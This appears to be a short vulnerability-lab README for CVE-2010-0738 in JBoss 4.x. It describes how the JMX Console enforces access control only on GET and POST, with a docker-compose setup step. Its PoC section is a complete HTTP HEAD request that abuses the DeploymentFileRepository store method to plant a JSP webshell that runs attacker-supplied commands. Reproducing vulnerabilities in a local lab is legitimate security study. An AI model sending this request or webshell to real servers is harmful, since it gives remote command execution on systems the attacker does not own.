# Jboss 4.x JMX Console HtmlAdaptor Getshell (CVE-2010-0738)

## Introduction

The JMX-Console web application in JBossAs in Red Hat JBoss Enterprise Application Platform (aka JBoss EAP or JBEAP) 4.2 before 4.2.0.CP09 and 4.3 before 4.3.0.CP08 performs access control only for the `GET` and `POST` methods, which allows remote attackers to send requests to this application's GET handler by using a different method, like `HEAD`.

## Setup

Run

```bash
docker-compose up
```

## Poc

Access to `http://localhost:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.admin%3Aservice%3DDeploymentFileRepository`, find the `store` method.

![1](images/1.png)

and use `HEAD` to post the jsp webshell

```http
HEAD /jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodIndex=6&arg0=..%2Fjmx-console.war%2F&arg1=hax0rwin&arg2=.jsp&arg3=<%Runtime.getRuntime().exec(request.getParameter("i"));%>&arg4=True HTTP/1.1
Host: hostx:portx
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 (.NET CLR 3.5.30729)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 300
Proxy-Connection: keep-alive
```

## References

1. https://jbossas.jboss.org/downloads/
2. https://book.iwonder.run/0day/Jboss/%EF%BC%88CVE-2010-0738%EF%BC%89JMX%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%AE%89%E5%85%A8%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.html